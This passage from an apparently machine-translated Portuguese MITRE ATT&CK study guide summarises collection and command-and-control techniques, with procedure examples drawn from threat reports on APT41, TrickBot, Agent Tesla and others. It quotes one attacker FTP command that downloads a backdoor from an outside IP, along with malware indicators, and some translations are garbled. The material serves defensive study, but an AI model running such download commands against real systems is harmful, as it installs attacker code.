- xxmm (também conhecido como Minzen) — Este RAT e provável sucessor das comunicações HTTP da Daserf AES criptografa as comunicações HTTP usando uma chave de criptografia única. A partir desta publicação, a BRONZE BUTLER demonstra preferência pelo uso concomitantemente do Datper e xxmm em suas operações. Os pesquisadores da CTU identificaram um construtor xxmm para xxmm (ver Figura 2), o que sugere que os atores de ameaças personalizam as configurações de malware xxmm com base no alvo.
          
**REFERÊNCIA:**  https://attack.mitre.org/techniques/T1039/
          
T10255 **Dados de mídia removível:** Os adversários podem pesquisar mídia removível conectada em computadores que eles comprometeram para encontrar arquivos de interesse.
          
**Exemplo de procedimento:** Este módulo encontra os dispositivos de mídia removíveis conectados à máquina e coleta seus dados antes de enviá-los para o servidor de comando e controle. Para identificar uma unidade USB, ele chama CM_Get_Device_IDW para recuperar o ID da ocorrência do dispositivo que estaria no formato "" e, em seguida, verifica se ele contém valor de sequência USB. <device-ID>\<instance-specific-ID>  
          
![image](https://user-images.githubusercontent.com/95362045/162225528-cb5bfdc2-f988-465b-894a-85ef91117ca0.png)

**Exemplo de procedimento:** https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/
          
 T1074 **Dados encenados:** Os adversários podem encenar dados coletados em um local central ou diretório antes da Exfiltração. Os dados podem ser mantidos em arquivos separados ou combinados em um arquivo através de técnicas como Archive Collected Data. Os projéteis de comando interativos podem ser usados, e a funcionalidade comum dentro do CMD e do Bash pode ser usada para copiar dados em um local de preparação
          
**Exemplo de procedimento:** O Wizard Spider coletou e encenou credenciais e informações de enumeração de rede, usando os módulos Networkdll e Psfin TrickBot: Após o acesso inicial, grim spider se concentra em coletar credenciais dos hosts comprometidos e usa RDP existente na tentativa de obter uma conta de administrador de domínio e acesso ao Controlador de Domínio do Windows. Esse processo pode levar várias iterações de colheita de credenciais, conectando-se a novos sistemas e estabelecendo persistência. Para os incidentes observados, esta fase do ataque pode durar de alguns dias a alguns meses.
          
**REFERÊNCIA:** https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/
          
.001 **Encenação de Dados Locais:** Os adversários podem encenar dados coletados em um local central ou diretório no sistema local antes da Exfiltração. Os dados podem ser mantidos em arquivos separados ou combinados em um arquivo através de técnicas como Archive Collected Data.
          
**Exemplo de procedimento:** 	Crutch encenou arquivos roubados no diretório.C:\AMD\Temp: A principal atividade maliciosa é a encenação, compressão e exfiltração de documentos e vários arquivos, como mostrado na Figura 1. Estes são comandos executados manualmente pelos operadores, não mostrando assim a coleta automatizada de documentos pelo componente do monitor de unidade descrito em uma seção posterior. A exfiltração é realizada por outro comando backdoor e, portanto, não mostrado nos exemplos abaixo.
          
![image](https://user-images.githubusercontent.com/95362045/162231025-b6f1d177-0be3-40c5-93c4-a778eb0e88df.png)
          
**REFERÊNCIA:** https://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/

.002 **Realização remota de dados:** Os adversários podem encenar dados coletados de vários sistemas em um local central ou diretório em um sistema antes da Exfiltração. Os dados podem ser mantidos em arquivos separados ou combinados em um arquivo através de técnicas como Archive Collected Data
          
**Exemplo de procedimento:** Leviatã tem dados encenados remotamente antes da exfiltração: Para evasão de defesa comando e controle, coleta e exfiltração foram usadas as seguintes técnicas: 
          
- Uso de esteganografia para ocultar dados roubados dentro de outros arquivos armazenados no GitHub
- Representação de protocolo  usando chaves API (Application Programming Interface, interface de programação de aplicativos) para contas Dropbox em comandos para carregar dados roubados para fazer parecer que a atividade era um uso legítimo do serviço Dropbox
- Túnel de protocolo  e proxies multi-hop , incluindo o uso de Tor 
- Uso de typosquatting de domínio para infraestrutura C2 
- Arquive , criptografe, e estágio coletado dados localmente  e remotamente para exfiltração
- Exfiltração no canal C2
          
**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa21-200a
          
 T1114 **Coleta de e-mails:** Os adversários podem direcionar o e-mail do usuário para coletar informações confidenciais. Os e-mails podem conter dados confidenciais, incluindo segredos comerciais ou informações pessoais, que podem ser valiosos para os adversários. Os adversários podem coletar ou encaminhar e-mails de servidores de e-mail ou clientes.
          
.001 **Coleta de e-mails locais:** Os adversários podem direcionar o e-mail do usuário em sistemas locais para coletar informações confidenciais. Arquivos contendo dados de e-mail podem ser adquiridos do sistema local do usuário, como armazenamento do Outlook ou arquivos de cache.

**Exemplo de procedimento:** O APT1 usa dois utilitários, GETMAIL e MAPIGET, para roubar e-mails. O GETMAIL extrai e-mails de arquivos arquivados do Outlook .pst.
          
**REFERÊNCIA:** https://www.mandiant.com/resources/apt1-exposing-one-of-chinas-cyber-espionage-units

.002 **Coleta remota de e-mails:** Os adversários podem aproveitar as credenciais de um usuário e interagir diretamente com o servidor Exchange para adquirir informações dentro de uma rede. Os adversários também podem acessar serviços de Exchange voltados externamente, Office 365 ou Google Workspace para acessar e-mails usando credenciais ou tokens de acesso
          
**Exemplo de procedimento:** O Valak pode coletar informações confidenciais de e-mail de servidores exchange, incluindo credenciais e o certificado de domínio de uma empresa:  Ao executar o PluginHost.exe ele instala vários modulos como o Exchgrabber, ele rouba os dados do microsoft exchange e se infiltra no sistema de email das empresas
          
**REFERÊNCIA:** https://www.cybereason.com/blog/research/valak-more-than-meets-the-eye
          
.003 **Regra de encaminhamento de e-mails:** Os adversários podem configurar regras de encaminhamento de e-mails para coletar informações confidenciais. Os adversários podem abusar das regras de encaminhamento de e-mails para monitorar as atividades de uma vítima, roubar informações e obter ainda mais informações sobre a vítima ou a organização da vítima para usar como parte de novas explorações ou operações
          
**Exemplo de procedimento:** Kimsuky estabeleceu regras automáticas nas contas de e-mail da vítima:  Kimsuky usou para exfiltrar dados roubados: via e-mail ou através de uma chave RC4 gerada como um hash MD5 ou um buffer de 117 bytes gerado aleatoriamente, seu malware na máquina da vítima criptografando os dados antes de enviá-los para um servidor C2 (Archive Collected Data [T1560]). Kimsuky também estabelece regras de auto-encaminhamento dentro da conta de e-mail da vítima 
          
**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-301a
          
T1056 **Captura de entrada:** Os adversários podem usar métodos de captura de entrada do usuário para obter credenciais ou coletar informações. Durante o uso normal do sistema, os usuários geralmente fornecem credenciais para vários locais diferentes, como páginas de login/portais ou caixas de diálogo do sistema.
          
**Exemplo de procedimento:** O APT39 utilizou ferramentas para capturar movimentos do mouse: O malware BITS 1.0, este Malware identificado como BITS 1.0, parecia funcionar em conjunto com o VBS e o autolt. Uma das funcionalidades dele executar o Splitter.exe ela contem funcões de capturar mause e tela, keylogger e configuração de IP
          
**REFERÊNCIA:** https://www.iranwatch.org/sites/default/files/public-intelligence-alert.pdf
          
.001 **Keylogging:** Os adversários podem registrar teclas de usuário para interceptar credenciais à medida que o usuário as digita. É provável que o keylogging seja usado para adquirir credenciais para novas oportunidades de acesso quando os esforços de dumping de credenciais do OS não forem eficazes, e podem exigir que um adversário intercepte teclas em um sistema por um período substancial de tempo antes que as credenciais possam ser capturadas com sucesso
          
**Exemplo de procedimento:** Agente Tesla pode registrar toques de teclas na máquina da vítima: O malware vem com rotinas de roubo de senhas para mais de 25 aplicativos comuns e outras funções de rootkit, como keylogging, roubo de área de transferência, capturas de tela e acesso à webcam. Senhas são roubadas dos seguintes aplicativos, entre outros:
          
- Cromar
- Firefox
- Internet Explorer
- Yandex
- Ópera
- Perspectiva
- Thunderbird
- IncrediMail
- Eudora
- FileZilla
- WinSCP
- Navegador FTP
- Paltalk
- Gerente de Download da Internet
- JDownloader
- Chaveiro da Apple
- SeaMonkey
- Dragão comodo
- Rebanho
- DynDNS

**REFERÊNCIA:** https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html
         
.002 **Captura de entrada gui:** Os adversários podem imitar componentes de GUI comuns do sistema operacional para solicitar aos usuários credenciais com um prompt aparentemente legítimo. Quando programas são executados que precisam de privilégios adicionais do que estão presentes no contexto atual do usuário, é comum que o sistema operacional solicite ao usuário credenciais adequadas para autorizar os privilégios elevados para a tarefa 
          
**Exemplo de procedimento:**  Anexado aos e-mails maliciosos, está um arquivo zip (Dokument.zip), que contém o malware. Os usuários que ingenuamente acreditam nas instruções no e-mail e unzip Dokument.zip, encontrarão um único arquivo chamado Dokument:

Usando um ícone (bastante pixelado) que imita o aplicativo 'Preview' da Apple, esse invasor claramente espera enganar o usuário para abrir este arquivo. Ao usar o WhatsYourSign podemos ver que este arquivo não é um documento, mas na verdade um aplicativo assinado (embora agora a Apple tenha revogado o certificado):

Se o usuário abrir o aplicativo, e clicar através do padrão "é um aplicativo baixado da Internet. Tem certeza que quer abri-lo? dia de alerta, eles serão infectados. 
![image](https://user-images.githubusercontent.com/95362045/162787270-95c9ebf1-8790-4b95-a8ef-542b5b687d69.png)

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x25.html#Dok    
          
.003 **Captura de portal da Web:** Os adversários podem instalar código em portais voltados externamente, como uma página de login VPN, para capturar e transmitir credenciais de usuários que tentam entrar no serviço. Por exemplo, uma página de login comprometida pode registrar credenciais do usuário antes de registrar o usuário no serviço.
     
**REFERÊNCIA:** https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/  
          
.004 **Gancho de API credencial:** Os adversários podem se conectar às funções de API (Application Programming Interface, interface de programação de aplicativos do Windows) para coletar credenciais do usuário. Mecanismos de gancho maliciosos podem capturar chamadas de API que incluem parâmetros que revelam credenciais de autenticação do usuário.      
          
**Exemplo de procedimento:**  TrickBot tem a capacidade de capturar credenciais RDP capturando a APICredEnumerateA:    O malware chega por um e-mail disfarçado como uma notificação de incentivo fiscal de uma grande empresa de serviços financeiros. Este e-mail inclui um anexo de planilha microsoft excel habilitado para macro (XLSM) (detectado como Trojan.W97M.MERETAM.A) que supostamente contém os detalhes do incentivo fiscal. No entanto, como esses anexos geralmente vão, essa macro é maliciosa e irá baixar e implantar Trickbot na máquina do usuário uma vez ativado. VNC
Para obter credenciais VNC, o módulo pwgrab procura arquivos usando o afixo "*.vnc.lnk" que estão localizados nos seguintes diretórios:

%APPDATA%\Microsoft\Windows\Recente
%USERPROFILE%\Documents, %USERPROFILE%\Downloads
 
**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/19/b/trickbot-adds-remote-application-credential-grabbing-capabilities-to-its-repertoire.html 
          
T1113 **Captura de tela:** Os adversários podem tentar capturar a tela da área de trabalho para coletar informações ao longo de uma operação. A funcionalidade de captura de tela pode ser incluída como um recurso de uma ferramenta de acesso remoto usada em operações pós-compromisso
          
**Exemplo de procedimento:** Agente Tesla pode capturar capturas de tela da área de trabalho da vítima. o Agente Tesla tem a capacidade de roubar as informações de login do usuário de uma série de peças importantes de software, como Google Chrome, Mozilla Firefox, Microsoft Outlook e muitos outros. Ele também pode ser usado para capturar capturas de tela, gravar webcams e permitir que os invasores instalem malware adicional em sistemas infectados.
          
 **REFERÊNCIA:**  https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html        
          
T1125 **Captura de vídeo:** Um adversário pode aproveitar os dispositivos periféricos de um computador (por exemplo, câmeras integradas ou webcams) ou aplicativos (por exemplo, serviços de chamada de vídeo) para capturar gravações de vídeo com o propósito de coletar informações. As imagens também podem ser capturadas a partir de dispositivos ou aplicativos, potencialmente em intervalos especificados, em vez de arquivos de vídeo. Malware ou scripts podem ser usados para interagir com os dispositivos através de uma API disponível fornecida pelo sistema operacional ou um aplicativo para capturar vídeos ou imagens.
          
**Exemplo de procedimento:**  Agente Tesla pode acessar a webcam da vítima e gravar vídeo. A entrega do Agente Tesla no computador da vítima é muitas vezes realizada através de phishing ou envio de e-mails com um anexo infectado. Agente Tesla também tem um recurso que permite que ele autorun a partir de um pendrive. Atualmente, o Agente Tesla só pode ser usado em sistemas operacionais Windows (todas as versões) enquanto o uso em outras plataformas como Mac ou Linux não é uma opção.    
          
**REFERÊNCIA:** https://www.digitrustgroup.com/agent-tesla-keylogger/  
          
TA0011**Comando e Controle:** 
          
O comando e o controle consistem em técnicas que os adversários podem usar para se comunicar com sistemas sob seu controle dentro de uma rede de vítimas. Os adversários geralmente tentam imitar o tráfego normal e esperado para evitar a detecção. Há muitas maneiras de um adversário estabelecer comando e controle com vários níveis de furtividade, dependendo da estrutura e defesa da rede da vítima.
          
T1071 **Protocolo de camada de aplicativos:**  Os adversários podem se comunicar usando protocolos de camada de aplicativo exemplo (TELNET, FTP, TFTP, SMTP, POP, IMAP, DNS, HTTP, HTTPS, RTP, MIME e TLS.)  para evitar a detecção/filtragem de rede, misturando-se com o tráfego existente. Os comandos para o sistema remoto, e muitas vezes os resultados desses comandos, serão incorporados dentro do tráfego de protocolo entre o cliente e o servidor.         
          
**Exemplo de procedimento:** Dragonfly 2.0 (é um grupo russo ) usou SMB para C2: Durante a campanha de phishing, os atores de ameaças usaram anexos de e-mail para aproveitar funções legítimas do Microsoft Office para recuperar um documento de um servidor remoto usando o protocolo SMB (Server Message Block, bloco de mensagens do servidor). (Um exemplo dessa solicitação é: arquivo[:]//<remote endereço IP>/Normal.dotm). Como parte dos processos padrão executados pelo Microsoft Word, essa solicitação autentica o cliente com o servidor, enviando o hash credencial do usuário para o servidor remoto antes de recuperar o arquivo solicitado. (Nota: a transferência de credenciais pode ocorrer mesmo que o arquivo não seja recuperado.) Depois de obter um hash de credencial, os atores de ameaça podem usar técnicas de quebra de senha para obter a senha do texto simples. Com credenciais válidas, os atores de ameaças são capazes de se disfarçar de usuários autorizados em ambientes que usam autenticação de fator único.
          
**REFERÊNCIA:**  https://www.cisa.gov/uscert/ncas/alerts/TA18-074A   
          
.001 **Protocolos Web:** Os atacantes podem se comunicar usando protocolos de camada de aplicativo associados ao tráfego da Web para evitar a detecção/filtragem de rede. Protocolos como HTTP e HTTPs que transportam trágefo Web podem ser muito comuns em ambientes.
          
**Exemplo de procedimentos:** O APT18 usa HTTP para comunicações C2 : A infraestrutura do ataque é entregue via HTTP da seguinte URL: http://globalprint-us[.] com/proxy_plugin.exe. Dentro dessa URL continham um executavél com as seguintes descrições. 
          
MD5: E4968C8060EA017B5e5756C16B80B012
SHA256: 8FFBB7A80EFA9EE79E96ABDE7A95CF8DC6 F9A41F9026672A8DBD95539FEA82A
Tamanho: 126976 Bytes
Compile Hora: 2016-04-28 00:38:46 UTC
          
**Exemplo de procedimento:** https://unit42.paloaltonetworks.com/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/
          
.002 **Protocolo de transferência de arquivos:** Os adversários podem se comunicar usando protocolos de camada de aplicativo associados à transferência de arquivos para evitar a detecção/filtragem de rede, misturando-se com o tráfego existente. Os comandos para o sistema remoto, e muitas vezes os resultados desses comandos, serão incorporados dentro do tráfego de protocolo entre o cliente e o servidor. Protocolos como FTP, FTPS e TFTP que transferem arquivos podem ser muito comuns em ambientes
          
**Exemplo de procedimento:** APT41 usou cargas de exploração que iniciam o download via FTP: Foi usado cargas de exploração CVE-2019-19781 que iniciam um downloads através do File Transfer Protocol (FTP), foi executado um comando /usr/bin/ftp -o/tmp/bsd ftp://test:[redacted]\@66.42.98[.]220/bsd que se conectou a 66.42.98[.]220 sobre o protocolo FTP logado no servidor FTP com um nome de usuário de 'teste' e uma senha que redigimos, e então baixamos uma carga desconhecida chamada 'bsd' (que provavelmente era um backdoor).
          
![image](https://user-images.githubusercontent.com/95362045/163810511-5e31ac80-223a-4022-a17b-9ba5e63bd6c6.png)

**REFERÊNCIA:** https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits
          
.003 **Protocolos de Correio:** Os adversários podem se comunicar usando protocolos de camada de aplicativo associados à entrega de correio eletrônico para evitar a detecção/filtragem de rede, misturando-se com o tráfego existente. Protocolos como SMTP/S, POP3/S e IMAP que carregam correio eletrônico podem ser muito comuns em ambientes. Os pacotes produzidos a partir desses protocolos podem ter muitos campos e cabeçalhos nos quais os dados podem ser ocultados.

**Exemplo de procedimento:** os ataques iniciais usando essa infraestrutura foram contra as vítimas através de phishing de lança.o malware exibirá um arquivo de isca do Microsoft Word em branco ou um arquivo do Microsoft Word com mensagem de erro: "Ocorreu um erro, por favor, tente seu pedido novamente mais tarde".
          
Microsoft Visual Basic Malware – exfiltra dados via SMTP (porta 26) e HTTP. A exfiltração de arquivos é feita através da porta SMTP 26, com as credenciais SMTP codificadas em criptografia no código de malware. Alguns exemplos de caixa de correio:
          
**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-badpatch/
          
.004 **DNS:** Os adversários podem se comunicar usando o protocolo de camada de aplicativos DNS (Domain Name System, sistema de nomes de domínio) para evitar a detecção/filtragem de rede, misturando-se com o tráfego existente. O protocolo DNS atende a uma função administrativa na rede de computadores e, portanto, pode ser muito comum em ambientes. O tráfego de DNS também pode ser permitido mesmo antes da autenticação da rede ser concluída. 
          
**Exemplo de procedimento:** O APT18 usa DNS para comunicações C2: A família de malware pisloader usa várias técnicas novas, como o uso de DNS como protocolo C2, bem como fazer uso de programação orientada ao retorno e outras táticas anti-análise.
          
**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/          
          
T1092 **Comunicação através de mídia removível:** Os adversários podem executar comando e controle entre hosts comprometidos em redes potencialmente desconectadas usando mídia removível para transferir comandos do sistema para o sistema. Ambos os sistemas precisariam ser comprometidos, com a probabilidade de que um sistema conectado à Internet fosse comprometido primeiro e o segundo através do movimento lateral por replicação através de mídia removível.
          
**Exemplo de procedimento:** O USBStealer derruba comandos de uma segunda vítima em uma unidade de mídia removível inserida na primeira vítima, e os comandos são executados quando a unidade é inserida na segunda vítima. A imagem a seguir apresenta uma visão geral de alto nível desta estratégia no caso simples de apenas dois computadores. O computador A está conectado à Internet e está inicialmente infectado com o porta-gotas Win32/USBStealer, enquanto o Computador B está fisicamente isolado e fica infectado com Win32/USBStealer durante o ataque.  
         
![image](https://user-images.githubusercontent.com/95362045/163818752-60fbb90c-06c4-4a8d-96a0-efe1b00cf0e7.png)
          
Neste cenário, uma mesma unidade removível vai e volta entre o computador A conectado à Internet e o computador B com escancarado a ar. Agora vamos explicar cada passo deste ataque com mais detalhes. Focamos aqui na versão mais complexa do Win32/USBStealer observada.
          
**REFERÊNCIA:**  https://www.welivesecurity.com/2014/11/11/sednit-espionage-group-attacking-air-gapped-networks/ 
          
T1132 **Codificação de dados:** Os adversários podem codificar dados para tornar o conteúdo de comando e controle de tráfego mais difícil de detectar. As informações de comando e controle (C2) podem ser codificadas usando um sistema de codificação de dados padrão. 
          
**Exemplo de procedimento:** H1N1 ofusca o tráfego C2 com uma versão alterada da base64:  Uma versão alterada do base64 é usada, conhecida como "BASE SEGURA DE URL64", simplesmente substitui caracteres "+" por caracteres "_" e caracteres "-" com caracteres "\". Uma vez que os caracteres base64 são substituídos e decodificados, ele pode ser descriptografado usando RC4.   
          
**REFERÊNCIA:** https://blogs.cisco.com/security/h1n1-technical-analysis-reveals-new-capabilities-part-2   
          
.001 **Codificação padrão:** Os adversários podem codificar dados com um sistema padrão de codificação de dados para tornar o conteúdo de comando e controle de tráfego mais difícil de detectar. As informações de comando e controle (C2) podem ser codificadas usando um sistema padrão de codificação de dados que adere às especificações de protocolo existentes.  
          
**Exemplo de procedimento:** Bisonal codificou dados binários com base64. Uma vez que o malware começa, ele tenta alcançar um C2 codificado. A comunicação ocorre usando o protocolo baseado em HTTP não modificado, o corpo de solicitação e resposta são criptografados pelo RC4 e a chave de criptografia também é codificada na amostra. Como o resultado da criptografia RC4 pode conter dados binários, o malware também codifica-os no BASE64, para corresponder à especificação HTTP.
          
**REFERÊNCIA:** https://securelist.com/cactuspete-apt-groups-updated-bisonal-backdoor/97962/ 
          
.002 **Codificação não padrão:**  Os adversários podem codificar dados com um sistema de codificação de dados fora do padrão para tornar o conteúdo de comando e controle de tráfego mais difícil de detectar.
          
**Exemplo de procedimento:** ShadowPad tem dados codificados como caracteres latinos legíveis:       
          
Os atacantes esconderam sua intenção maliciosa em várias camadas de código criptografado. A arquitetura hierárquica impede que as lógicas reais de negócios do backdoor sejam ativadas até que um pacote especial seja recebido do servidor de comando e controle de primeiro nível (C&C) ("servidor de ativação C&C"). Até lá, ele só transfere informações básicas, incluindo o computador, domínio e nomes de usuários, a cada 8 horas.

A ativação da carga será acionada através de um registro DNS TXT especialmente elaborado para um domínio específico. O nome de domínio é gerado com base nos valores atuais do mês e do ano, por exemplo, para agosto de 2017 o nome de domínio usado seria "nylalobghyhirgh.com".
          
          
![image](https://user-images.githubusercontent.com/95362045/163825355-342be06d-7421-4167-aff8-a4599b97256f.png)
          
          
O módulo realiza uma rápida troca com o servidor DNS controlador e fornece informações básicas de destino (domínio e nome do usuário, data do sistema, configuração da rede) ao servidor. O servidor C&C DNS em troca envia de volta a chave de descriptografia para o próximo estágio do código, ativando efetivamente o backdoor. Os dados trocados entre o módulo e o C&C são criptografados com um algoritmo proprietário e, em seguida, codificados como caracteres latinos legíveis. Cada pacote também contém um valor DWORD "mágico" criptografado "52 4F 4F 44" ('PORTA' se lido como um valor pouco endivoado).
          
**REFERÊNCIA:** https://securelist.com/shadowpad-in-corporate-networks/81432/
          
T1001 **Ofuscação de dados:** Os adversários podem ofuscar o comando e controlar o tráfego para dificultar a detecção. As comunicações de comando e controle (C2) estão ocultas (mas não necessariamente criptografadas) na tentativa de tornar o conteúdo mais difícil de descobrir ou decifrar e tornar a comunicação menos visível e esconder comandos de serem vistos. 
          
**Exemplo de procedimento:** O RDAT usou dados codificados dentro de subdomínios como texto cifrado AES para se comunicar do host ao C2.    Os dados codificados no farol (subdomínio) são cifrados gerados usando AES e uma chave de 16 byte gerada pela concatenação de dois caracteres alfanuméricos escolhidos aleatoriamente que também estão presentes no subdomínio imediatamente antes do domínio C2. Por exemplo, se os dois caracteres alfanuméricos aleatórios incluídos no subdomínio fossem R2, a carga usaria a string R2R2R2R2R2R2R2R2R2R2R2 como uma chave para criptografar os dados. O farol de exemplo acima seria descriptografado para 1,6.1.0_Y.2619, que está estruturado da seguinte forma:

< valor do tipo de comunicação>.<ID da versão de carga codificada > <>> <>   

A carga decodifica a resposta para uma resposta à consulta TXT com base64 e descriptografas usando a mesma cifra e chave AES que a solicitação. A carga tenta analisar o texto cleartext descriptografado usando a expressão regular "[^,]+" para obter o valor de comando e os argumentos de comando que são divididos com uma vírgula. A carga então verifica o valor do comando usando um manipulador de comando que tem a capacidade de executar comandos e carregar e baixar arquivos, como visto na Tabela 1.          
          
![image](https://user-images.githubusercontent.com/95362045/163826344-62879a43-7d83-42eb-b069-94b75fcb7a36.png)        

 .001 **Dados de lixo:** Os adversários podem adicionar dados de lixo aos protocolos usados para comando e controle para dificultar a detecção. 
          
 **Exemplo de procedimento:**  Os adversários podem adicionar dados de lixo aos protocolos usados para comando e controle para dificultar a detecção: malware de Plead assinadas são altamente ofuscadas com código de lixo, mas o propósito do malware é semelhante em todas as amostras: ele baixa de um servidor remoto ou abre a partir do disco local uma pequena bolha binária criptografada. Esta bolha binária contém shellcode criptografado, que baixa o módulo backdoor final Plead.

![image](https://user-images.githubusercontent.com/95362045/163827675-cdbf6009-69ba-42ac-b925-04d163cbfb2f.png)
          
**REFERÊNCIA:** https://www.welivesecurity.com/2018/07/09/certificates-stolen-taiwanese-tech-companies-plead-malware-campaign/          
          
 .002 **Esteganografia:** Os adversários podem usar técnicas esteganográficas para ocultar o comando e controlar o tráfego para dificultar os esforços de detecção. Técnicas steganográficas podem ser usadas para ocultar dados em mensagens digitais que são transferidas entre sistemas.
          
**Exemplo de procedimento:**  O RDAT pode processar imagens esteganográficas anexadas a mensagens de e-mail para enviar e receber comandos C2. O RDAT também pode incorporar mensagens adicionais em imagens BMP para se comunicar com o operador RDAT. 
          
**REFERÊNCIA:**  O RDAT pode processar imagens esteganográficas anexadas a mensagens de e-mail para enviar e receber comandos C2. O RDAT também pode incorporar mensagens adicionais em imagens BMP para se comunicar com o operador RDAT.       
 
.003 **Personificação do Protocolo:** Os adversários podem se passar por protocolos legítimos ou tráfego de serviços web para disfarçar a atividade de comando e controle e frustrar os esforços de análise. Ao se passar por protocolos legítimos ou serviços web, os adversários podem fazer com que seu comando e controle de tráfego se misture com tráfego de rede legítimo.          
          
**Exemplo de procedimento:** BADCALL usa um método FakeTLS durante o C2:  a conexão desse malware de proxy com o sistema de proxy de destino começará por meio de uma tentativa de conexão "TLS falso" Essencialmente, o malware inicia a sessão TLS usando um dos vários certificados 
SSL públicos obtidos de serviços de Internet legítimos e bem conhecidos e incorporados ao malware. O malware inicia uma sessão TLS com o destino do proxy emitindo 
chamadas para as funções OpenSSL SSL_new(), SSL_set_fd e SSL_connect(). O malware então envia e recebe dados iniciais (valores de autenticação) de e para o sistema 
proxy de destino usando as funções OpenSSL SSL_read() e SSL_write(). No entanto, o malware nunca completa o handshake TLS, em vez disso decodifica os dados após o 
recebimento usando a cifra XOR/ADD descrita anteriormente.
          
**REFERÊNCIA:** https://www.cisa.gov/uscert/sites/default/files/publications/MAR-10135536-G.PDFhttps://www.cisa.gov/uscert/sites/default/files/publications/MAR-10135536-G.PDF          
          
T1568 **Resolução Dinâmica:** Os adversários podem estabelecer dinamicamente conexões para a infraestrutura de comando e controle para evitar detecções e remediações comuns. Isso pode ser alcançado usando malware que compartilha um algoritmo comum com a infraestrutura que o adversário usa para receber as comunicações do malware          
**Exemplo de procedimento:** Maze forjou strings POST com uma escolha aleatória a partir de uma lista de possibilidades incluindo "fórum", "php", "view", etc. ao fazer conexão com o C2, dificultando os esforços de detecção.          
          
**REFERÊNCIA:** https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ransomware-maze/          
          
.001 **DNS de fluxo rápido:**  Os adversários podem usar o DNS fast flux para ocultar um canal de comando e controle atrás de uma matriz de endereços IP que mudam rapidamente ligados a uma única resolução de domínio. Esta técnica usa um nome de domínio totalmente qualificado, com vários endereços IP atribuídos a ele que são trocados com alta frequência, usando uma combinação de endereçamento IP de robin redondo e TTL (Time-To-Live) para um registro de recursos DNS       
          
**Exemplo de procedimento:**  os operadores gh0st RAT usaram DNS dinâmicos para mascarar a localização verdadeira de seu C2 por trás da mudança rápida de endereços IP.       
          
**REFERÊNCIA:** https://cybersecurity.att.com/blogs/labs-research/the-odd-case-of-a-gh0strat-variant          
          
 .002 **Algoritmos de geração de domínio:** Os adversários podem fazer uso de DGAs (Domain Generation Algorithms, algoritmos de geração de domínio) para identificar dinamicamente um domínio de destino para tráfego de comando e controle, em vez de depender de uma lista de endereços IP estáticos ou domínios. Isso tem a vantagem de tornar muito mais difícil para os defensores bloquear, rastrear ou assumir o canal de comando e controle, pois potencialmente poderia haver milhares de domínios que o malware pode verificar por instruções         
          
**Exemplo de procedimento:** O Grandoreiro pode usar um DGA para ocultar endereços C2, incluindo o uso de um algoritmo com uma chave específica do usuário que muda diariamente.
          
**REFERÊNCIA:** https://securelist.com/the-tetrade-brazilian-banking-malware/97779/
          
.003 **Cálculo de DNS:** Os adversários podem realizar cálculos em endereços retornados nos resultados do DNS para determinar qual porta e endereço IP usar para comando e controle, em vez de depender de um número de porta predeterminado ou do endereço IP real devolvido. Um cálculo de IP e/ou número de porta pode ser usado para contornar a filtragem de saída em um canal C2. 
          
**Exemplo de procedimento:** O APT12 usou várias variantes do Cálculo DNS, incluindo multiplicar os dois primeiros octetos de um endereço IP e adicionar o terceiro octeto a esse valor, a fim de obter uma porta de comando e controle resultante.           
          
**REFERÊNCIA:** https://www.crowdstrike.com/blog/whois-numbered-panda/
          
T1573 **Canal criptografado:** Os adversários podem empregar um algoritmo de criptografia conhecido para ocultar o tráfego de comando e controle, em vez de depender de quaisquer proteções inerentes fornecidas por um protocolo de comunicação. Apesar do uso de um algoritmo seguro, essas implementações podem ser vulneráveis à engenharia reversa se as chaves secretas forem codificadas e/ou geradas em amostras de malware/arquivos de configuração.
          
**Exemplo de procedimento:** gh0st RAT criptografou comunicações TCP para evitar a detecção: Gh0stRAT, esta amostra não só mudou o cabeçalho Gh0stRAT de "Gh0st" para "nbLGX", como também escondeu seu tráfego com um algoritmo de criptografia em todo o segmento TCP, além da compressão padrão zlib nos dados gh0stRAT. Algumas funcionalidades principais estão abaixo:
          
- Pode baixar mais malware
- Offline Keylogger
- Limpa os registros do evento.          
          
 ![image](https://user-images.githubusercontent.com/95362045/163858313-225f7730-ef7d-4440-b2e6-94847bdba841.png)
          
[Captura de tela 1] Pacote de login criptografado enviado pelo PC infectado por Gh0stRAT

Além de um post padrão de blog de análise de malware, também gostaria de aproveitar esse tempo para documentar e descrever meus métodos de análise, na esperança de que você, como leitor, use essas técnicas no futuro.
          
**REFERÊNCIA:** https://cybersecurity.att.com/blogs/labs-research/the-odd-case-of-a-gh0strat-variant          
          
.001 **Criptografia simétrica:** Os adversários podem empregar um algoritmo de criptografia simétrica conhecido para ocultar o tráfego de comando e controle, em vez de depender de quaisquer proteções inerentes fornecidas por um protocolo de comunicação        

**Exemplo de procedimento:** Os comandos de comando e controle 3PARA RAT são criptografados dentro do canal HTTP C2 usando o algoritmo DES no modo CBC com uma chave derivada do hash MD5 da string HYF54&%9&jkMCXUIS. 3PARA RAT usará uma chave XOR de 8 byte derivada da string HYF54&%9&jkMCXUIS se a decodificação DES falhar.
          
**REFERÊNCIA:** http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf
          
.002 **Criptografia assimétrica:**  Os adversários podem empregar um algoritmo de criptografia assimétrica conhecido para ocultar o tráfego de comando e controle, em vez de depender de quaisquer proteções inerentes fornecidas por um protocolo de comunicação 
          
